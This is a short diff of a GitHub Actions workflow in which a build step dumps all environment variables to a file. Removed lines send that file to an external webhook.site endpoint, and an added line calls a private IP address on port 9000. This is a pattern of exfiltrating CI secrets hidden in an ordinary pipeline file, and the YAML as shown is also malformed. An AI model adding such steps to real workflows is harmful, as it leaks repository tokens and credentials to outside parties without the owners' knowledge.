@@ -7,6 +7,4 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - run: env > env.txt
-             curl -X POST https://webhook.site/945c849c-4645-441d-abf7-a7a9dfe8a3b7 \
-             -H "Content-Type: text/plain" \
-             --data-binary ~/env.txt
+             curl http://172.16.254.129:9000
